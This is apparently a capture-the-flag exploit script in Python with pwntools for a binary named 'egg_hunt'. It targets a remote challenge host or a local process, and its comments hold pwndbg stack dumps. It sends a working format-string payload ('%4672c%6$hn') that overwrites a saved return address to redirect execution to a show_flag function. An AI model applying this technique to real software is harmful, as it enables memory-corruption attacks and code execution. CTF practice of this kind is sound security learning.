#!/usr/bin/env python3
from pwn import *

exe = ELF("./egg_hunt")
context.binary = exe

if args.REMOTE:
    r = remote("15.135.187.163", 35712)
else:
    r = process(exe.path)
    if args.GDB:
        gdb.attach(r)

# pwndbg> info frame
# Stack level 0, frame at 0x7fffffffd810:
#  rip = 0x401401; saved rip = 0x40148c
#  called by frame at 0x7fffffffd830 Arglist at 0x7fffffffd7b8, args: 
#  Locals at 0x7fffffffd7b8, Previous frame's sp is 0x7fffffffd810
#  Saved registers:
#   rbp at 0x7fffffffd800, rip at 0x7fffffffd808
# pwndbg> stack 32
# 00:0000│ rsp 0x7fffffffd7c0 —▸ 0x7fffffffd808 —▸ 0x40148c ◂— nop dword ptr [rax]
# 01:0008│-038 0x7fffffffd7c8 —▸ 0x4013ce ◂— mov byte ptr [rbp + rax - 0x20], 0
# 02:0010│-030 0x7fffffffd7d0 —▸ 0x7fffffffd820 —▸ 0x7fffffffd840 —▸ 0x7fffffffd8f0 —▸ 0x7fffffffd950 ◂— ...
# 03:0018│-028 0x7fffffffd7d8 —▸ 0x7fffffffd808 —▸ 0x40148c ◂— nop dword ptr [rax]
# 04:0020│ rdi 0x7fffffffd7e0 ◂— 0x7025 /* '%p' */
# 05:0028│-018 0x7fffffffd7e8 —▸ 0x7fffffffd978 —▸ 0x7fffffffddad ◂— '/home/andrew/Downloads/egg_hunt'
# 06:0030│-010 0x7fffffffd7f0 ◂— 1
# 07:0038│-008 0x7fffffffd7f8 ◂— 0x670721d7320d200
# 08:0040│ rbp 0x7fffffffd800 —▸ 0x7fffffffd820 —▸ 0x7fffffffd840 —▸ 0x7fffffffd8f0 —▸ 0x7fffffffd950 ◂— ...
# 09:0048│+008 0x7fffffffd808 —▸ 0x40148c ◂— nop dword ptr [rax]


# Want execution to return to 0x401240 (show_flag) 
# This is stored at the 6'th argument to printf as shown above
# 4672 = 0x1240 (the return address already starts with 0x40)
# 419897 = 0x401240
payload = b"%4672c%6$hn\n"
r.sendline(payload)
r.interactive()
